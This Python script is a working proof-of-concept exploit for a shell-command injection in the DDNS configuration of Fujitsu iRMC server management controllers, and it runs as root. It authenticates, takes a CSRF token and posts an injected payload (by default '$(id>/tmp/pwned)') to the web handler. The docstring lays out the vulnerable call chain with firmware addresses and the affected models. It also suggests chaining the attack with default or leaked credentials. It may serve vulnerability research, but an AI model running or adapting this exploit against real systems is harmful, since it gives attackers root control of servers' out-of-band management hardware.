#!/usr/bin/env python3
"""
Fujitsu iRMC S5/S4 DDNS Hostname Shell Injection — F13 PoC

Vulnerability:
  FTS_WebServer::dynDns() reads DDNS config from configSpace and builds a shell
  command via snprintf() with no quoting:
    snprintf(buf, 0x200, "sh  %s %s %s.%s %s 0 0 %s\\n",
             "/usr/local/bin/nsupdate.sh", op, hostname, domain, ip, ...)
  The result is passed to safe_system() → libsafesystem.so → execdaemon pipe
  → system() running as root.

  Injectable fields (iRMC web form, configSpace IDs used as HTML field names):
    0x1430  DDNS domain/zone name    maxlen=64
    0x1432  DDNS hostname prefix     maxlen=16
    0x144d  DNS domain name          maxlen=256

Trigger:
  HTTP POST to iRMC web handler with:
    APPLY=4   (primary NIC, triggers dynDns() -> IPv4 path)
    P700=1    (presence signals IPv4 nsupdate path)
  Fields 0x1430/0x1432 set to payload.

Call chain (CX2550 M4 / Kronos5):
  dynDns VA 0x69530 → nsupdate_add_delete VA 0x68ecc →
  snprintf VA 0x692f8 → safe_system VA 0x6930c →
  libsafesystem::safe_system_exec → write /var/execdaemon_pipe →
  execdaemon system() → root

Platforms: CX2550 M5/M4 (Kronos5), PRIMEQUEST 3000B (D3858), RX2530 M1 (Kronos4)

Auth: iRMC admin/operator session. Combine with F2 (default ADMIN hash dbd403e3...)
      or F1 (LDAP mmb1234) to reach from network.

Controlled env only.
"""

import sys
import re
import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_session(base_url: str, user: str, password: str) -> tuple[requests.Session, str]:
    s = requests.Session()
    s.verify = False
    s.headers.update({'User-Agent': 'Mozilla/5.0'})

    # GET login page — grab CSRF token
    r = s.get(f"{base_url}/", allow_redirects=True)
    csrf = _extract_csrf(r.text)

    r = s.post(f"{base_url}/login", data={
        'APPLY': '99',
        'P91': user,
        'P92': password,
        '_csrf': csrf,
    }, allow_redirects=True)

    if r.status_code not in (200, 302):
        raise RuntimeError(f"login POST returned {r.status_code}")

    # Refresh CSRF from authenticated response
    csrf2 = _extract_csrf(r.text) or csrf
    return s, csrf2


def _extract_csrf(html: str) -> str:
    m = re.search(r'name="_csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ''


def inject_ddns(base_url: str, session: requests.Session, csrf: str,
                payload: str, apply_val: str = '4') -> requests.Response:
    """
    POST to iRMC web handler with injected DDNS field.

    The form action is '#primary' (primary NIC) for APPLY=4.
    Field 0x1430 = DDNS domain name (injected).
    Field 0x1432 = hostname prefix (shorter field, also injectable).
    P700 must be present to trigger the IPv4 nsupdate_add_delete path.
    """
    data = {
        'APPLY':  apply_val,
        '_csrf':  csrf,
        '0x1430': payload,   # injectable DDNS domain/zone — feeds %s in sh template
        '0x1432': 'irmc',    # hostname prefix (kept benign; payload in domain field)
        '0x1431': '1',       # DDNS enable checkbox
        '0x1433': '0',
        '0x1434': '0',
        'P700':   '1',       # triggers IPv4 path in dynDns
    }
    print(f"[*] POST {base_url}/ APPLY={apply_val}")
    print(f"[*] 0x1430 (domain) = {payload!r}")
    r = session.post(f"{base_url}/", data=data, allow_redirects=False)
    print(f"[*] response: {r.status_code}")
    return r


def main():
    ap = argparse.ArgumentParser(description='Fujitsu iRMC DDNS shell injection (F13 PoC)')
    ap.add_argument('--host',    required=True, help='iRMC host (IP or hostname)')
    ap.add_argument('--user',    default='admin')
    ap.add_argument('--pass',    dest='password', default='admin')
    ap.add_argument('--payload', default='$(id>/tmp/pwned)',
                    help='Shell payload to inject into DDNS domain field (default: write /tmp/pwned)')
    ap.add_argument('--apply',   default='4',
                    help='APPLY value: 4=primary NIC, 5=secondary NIC')
    ap.add_argument('--csrf',    default='',
                    help='Supply CSRF token directly (skip login flow)')
    args = ap.parse_args()

    base_url = f"https://{args.host}"

    if args.csrf:
        s = requests.Session()
        s.verify = False
        csrf = args.csrf
    else:
        print(f"[*] authenticating to {base_url}")
        s, csrf = get_session(base_url, args.user, args.password)
        print(f"[*] session established, csrf={csrf[:16]}...")

    inject_ddns(base_url, s, csrf, args.payload, args.apply)
    print("[*] trigger sent — if successful, payload executed via system() on BMC")


if __name__ == '__main__':
    main()
